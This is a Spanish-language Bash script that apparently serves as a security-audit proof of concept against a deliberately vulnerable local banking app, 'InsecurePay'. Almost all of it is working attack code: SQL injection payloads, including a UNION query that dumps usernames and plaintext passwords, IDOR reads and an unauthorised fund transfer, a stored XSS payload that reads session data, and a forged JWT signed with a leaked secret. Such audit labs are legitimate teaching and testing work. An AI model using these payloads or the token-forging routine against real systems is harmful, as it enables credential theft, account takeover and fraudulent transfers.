#!/usr/bin/env bash
set -u

API="${API:-http://localhost:8080/api}"
BASE="${API%/api}"
SECRETO_FILTRADO="ClaveSecretaSuperDebilInsecurePayBanco2026"
IBAN_CARLOS="CR05015202001026458901"
IBAN_MARIA="CR05015202001026458902"
RESP="$(mktemp)"

FILTRO_LISTA='if type=="array" then {total: length, registros: [.[] | {id, origen: .titularOrigen, destino: .titularDestino, monto, conceptoHtml}]} else . end'
FILTRO_CUENTAS='if type=="array" then {total: length, cuentas: [.[] | {id, titular, numeroCuenta, saldo}]} else . end'
FILTRO_ERROR='if type=="object" and has("trace") then .trace |= (.[0:900] + " ...[recortado]") else . end'

titulo() {
    printf '\n################################################################\n'
    printf '# %s\n' "$1"
    printf '################################################################\n'
}

paso() {
    printf '\n>>> %s\n' "$1"
}

mostrar_comando() {
    printf '$ %s\n' "$1"
}

peticion() {
    local filtro="$1"
    shift
    local codigo
    codigo=$(curl -s -o "$RESP" -w '%{http_code}' "$@")
    printf 'HTTP %s\n' "$codigo"
    if jq -e . "$RESP" >/dev/null 2>&1; then
        jq "if type==\"object\" and has(\"title\") and has(\"status\") then . else ($filtro) end" "$RESP"
    else
        head -c 600 "$RESP"
        printf '\n'
    fi
}

login() {
    curl -s -X POST "$API/auth/login" \
        -H 'Content-Type: application/json' \
        -d "{\"username\":\"$1\",\"password\":\"$2\"}" | jq -r '.token // empty'
}

forjar_token() {
    python3 - "$1" <<'PY'
import base64, hashlib, hmac, json, sys, time
def b64(d):
    return base64.urlsafe_b64encode(d).rstrip(b"=").decode()
ahora = int(time.time())
cabecera = b64(json.dumps({"alg": "HS256"}).encode())
cuerpo = b64(json.dumps({"iss": "insecurepay", "sub": "maria_rojas", "rol": "CLIENTE", "usuarioId": 4, "iat": ahora, "exp": ahora + 3600}).encode())
firma = b64(hmac.new(sys.argv[1].encode(), f"{cabecera}.{cuerpo}".encode(), hashlib.sha256).digest())
print(f"{cabecera}.{cuerpo}.{firma}")
PY
}

printf 'InsecurePay - Evidencias periciales\n'
printf 'Fecha UTC: %s\n' "$(date -u '+%Y-%m-%d %H:%M:%S')"
printf 'Version auditada: %s\n' "${VERSION_AUDITADA:-local}"
printf 'API: %s\n' "$API"

TOKEN_CARLOS="$(login carlos_mora carlos123)"
TOKEN_MARIA="$(login maria_rojas maria123)"
printf 'Token carlos_mora obtenido: %s...\n' "${TOKEN_CARLOS:0:24}"

titulo "HALLAZGO-01 | SQL Injection en GET /api/transacciones/buscar"

paso "Busqueda legitima de carlos_mora con el termino 'Reembolso'"
mostrar_comando "curl -G $API/transacciones/buscar --data-urlencode \"termino=Reembolso\" -H \"Authorization: Bearer <TOKEN_CARLOS>\""
peticion "$FILTRO_LISTA" -G "$API/transacciones/buscar" --data-urlencode "termino=Reembolso" -H "Authorization: Bearer $TOKEN_CARLOS"

paso "Payload booleano sin token: ' OR 1=1 --"
mostrar_comando "curl -G $API/transacciones/buscar --data-urlencode \"termino=' OR 1=1 --\" -H \"Accept: application/json\""
peticion "$FILTRO_LISTA" -G "$API/transacciones/buscar" --data-urlencode "termino=' OR 1=1 --" -H "Accept: application/json"

paso "Payload booleano con token de carlos_mora: ' OR '1'='1"
mostrar_comando "curl -G $API/transacciones/buscar --data-urlencode \"termino=' OR '1'='1\" -H \"Authorization: Bearer <TOKEN_CARLOS>\""
peticion "$FILTRO_LISTA" -G "$API/transacciones/buscar" --data-urlencode "termino=' OR '1'='1" -H "Authorization: Bearer $TOKEN_CARLOS"

titulo "HALLAZGO-02 | IDOR / BOLA en cuentas, saldos y transferencias"

paso "carlos_mora consulta su propia cuenta (ID 2)"
mostrar_comando "curl $API/cuentas/2 -H \"Authorization: Bearer <TOKEN_CARLOS>\""
peticion '{id, titular, numeroCuenta, saldo, status, detail}' "$API/cuentas/2" -H "Authorization: Bearer $TOKEN_CARLOS"

paso "carlos_mora consulta la cuenta ID 3 (propiedad de maria_rojas)"
mostrar_comando "curl $API/cuentas/3 -H \"Authorization: Bearer <TOKEN_CARLOS>\""
peticion '{id, titular, numeroCuenta, saldo, status, title, detail}' "$API/cuentas/3" -H "Authorization: Bearer $TOKEN_CARLOS"

paso "carlos_mora consulta el saldo de la cuenta ID 3"
mostrar_comando "curl $API/cuentas/3/saldo -H \"Authorization: Bearer <TOKEN_CARLOS>\""
peticion '{cuentaId, numeroCuenta, saldo, status, title, detail}' "$API/cuentas/3/saldo" -H "Authorization: Bearer $TOKEN_CARLOS"

paso "carlos_mora lista las cuentas del usuario ID 4 (maria_rojas)"
mostrar_comando "curl $API/cuentas/usuario/4 -H \"Authorization: Bearer <TOKEN_CARLOS>\""
peticion "$FILTRO_CUENTAS" "$API/cuentas/usuario/4" -H "Authorization: Bearer $TOKEN_CARLOS"

paso "Listado global de cuentas sin token"
mostrar_comando "curl $API/cuentas"
peticion "$FILTRO_CUENTAS" "$API/cuentas"

paso "carlos_mora debita 100000 CRC desde la cuenta ID 3 de maria_rojas hacia su cuenta $IBAN_CARLOS"
CUERPO_IDOR="{\"cuentaOrigenId\":3,\"numeroCuentaDestino\":\"$IBAN_CARLOS\",\"monto\":100000,\"conceptoHtml\":\"Transferencia no autorizada\"}"
mostrar_comando "curl -X POST $API/transacciones/transferir -H \"Authorization: Bearer <TOKEN_CARLOS>\" -H \"Content-Type: application/json\" -d '$CUERPO_IDOR'"
peticion '{id, origen: .numeroCuentaOrigen, titularOrigen, destino: .numeroCuentaDestino, monto, estado, status, title, detail}' \
    -X POST "$API/transacciones/transferir" \
    -H "Authorization: Bearer $TOKEN_CARLOS" -H 'Content-Type: application/json' -d "$CUERPO_IDOR"

paso "maria_rojas verifica el saldo de su cuenta ID 3 (saldo inicial 4850000.00)"
peticion '{id, numeroCuenta, saldo}' "$API/cuentas/3" -H "Authorization: Bearer $TOKEN_MARIA"

titulo "HALLAZGO-03 | Stored XSS en el concepto de transferencias"

PAYLOAD_XSS='Pago de Servicios <img src="x" onerror="alert('"'"'AUDITORIA FORENSE: Brecha XSS confirmada. Sesion: '"'"' + localStorage.getItem('"'"'insecure_pay_user'"'"'))">'
CUERPO_XSS="$(jq -nc --arg c "$PAYLOAD_XSS" --arg d "$IBAN_MARIA" '{cuentaOrigenId: 2, numeroCuentaDestino: $d, monto: 1000, conceptoHtml: $c}')"

paso "carlos_mora envia una transferencia con el vector XSS en el concepto"
mostrar_comando "curl -X POST $API/transacciones/transferir -H \"Authorization: Bearer <TOKEN_CARLOS>\" -H \"Content-Type: application/json\" -d '$CUERPO_XSS'"
peticion '{id, conceptoHtml, status, detail}' -X POST "$API/transacciones/transferir" \
    -H "Authorization: Bearer $TOKEN_CARLOS" -H 'Content-Type: application/json' -d "$CUERPO_XSS"
ID_XSS="$(jq -r '.id // empty' "$RESP")"

if [ -n "$ID_XSS" ]; then
    paso "Lectura del comprobante persistido (transaccion $ID_XSS) por la victima maria_rojas"
    mostrar_comando "curl $API/transacciones/$ID_XSS -H \"Authorization: Bearer <TOKEN_MARIA>\""
    peticion '{id, conceptoHtml}' "$API/transacciones/$ID_XSS" -H "Authorization: Bearer $TOKEN_MARIA"
fi

titulo "HALLAZGO-04 | Contrasenas almacenadas en texto plano"

paso "Login con usuario inexistente (enumeracion de usuarios)"
mostrar_comando "curl -X POST $API/auth/login -H \"Content-Type: application/json\" -d '{\"username\":\"usuario_fantasma\",\"password\":\"x\"}'"
peticion "$FILTRO_ERROR" -X POST "$API/auth/login" -H 'Content-Type: application/json' -d '{"username":"usuario_fantasma","password":"x"}'

PAYLOAD_UNION="zzz' UNION ALL SELECT id, 2, 3, 0.00, username || ':' || password, TIMESTAMP '2026-01-01 00:00:00', rol FROM USUARIOS --"
paso "Volcado de la tabla USUARIOS mediante UNION sobre la busqueda"
mostrar_comando "curl -G $API/transacciones/buscar --data-urlencode \"termino=$PAYLOAD_UNION\" -H \"Authorization: Bearer <TOKEN_CARLOS>\""
peticion 'if type=="array" then {total: length, credenciales: [.[] | {rol: .estado, "usuario:password": .conceptoHtml}]} else . end' \
    -G "$API/transacciones/buscar" --data-urlencode "termino=$PAYLOAD_UNION" -H "Authorization: Bearer $TOKEN_CARLOS"

titulo "HALLAZGO-05 | Fuga de trazas tecnicas y configuracion insegura"

paso "Comilla simple aislada en la busqueda"
mostrar_comando "curl -G $API/transacciones/buscar --data-urlencode \"termino='\" -H \"Authorization: Bearer <TOKEN_CARLOS>\""
peticion "$FILTRO_ERROR" -G "$API/transacciones/buscar" --data-urlencode "termino='" -H "Authorization: Bearer $TOKEN_CARLOS"

paso "Identificador no numerico en /api/cuentas/{id}"
mostrar_comando "curl $API/cuentas/abc -H \"Authorization: Bearer <TOKEN_CARLOS>\""
peticion "$FILTRO_ERROR" "$API/cuentas/abc" -H "Authorization: Bearer $TOKEN_CARLOS"

paso "Cuenta inexistente en /api/cuentas/{id}"
mostrar_comando "curl $API/cuentas/999 -H \"Authorization: Bearer <TOKEN_CARLOS>\""
peticion "$FILTRO_ERROR" "$API/cuentas/999" -H "Authorization: Bearer $TOKEN_CARLOS"

paso "Cuerpo JSON malformado en /api/transacciones/transferir"
mostrar_comando "curl -X POST $API/transacciones/transferir -H \"Content-Type: application/json\" -d '{ json roto' -H \"Authorization: Bearer <TOKEN_CARLOS>\""
peticion "$FILTRO_ERROR" -X POST "$API/transacciones/transferir" -H 'Content-Type: application/json' -d '{ json roto' -H "Authorization: Bearer $TOKEN_CARLOS"

paso "Exposicion de la consola H2"
mostrar_comando "curl -o /dev/null -w '%{http_code}' $BASE/h2-console/"
printf 'HTTP %s\n' "$(curl -s -o /dev/null -w '%{http_code}' "$BASE/h2-console/")"

paso "Token JWT forjado para maria_rojas con la clave publicada en application.properties"
TOKEN_FORJADO="$(forjar_token "$SECRETO_FILTRADO")"
mostrar_comando "curl $API/cuentas/3 -H \"Authorization: Bearer <TOKEN_FORJADO_maria_rojas>\""
peticion '{id, titular, numeroCuenta, saldo, status, title, detail}' "$API/cuentas/3" -H "Authorization: Bearer $TOKEN_FORJADO"

rm -f "$RESP"
printf '\nFin de la ejecucion pericial.\n'
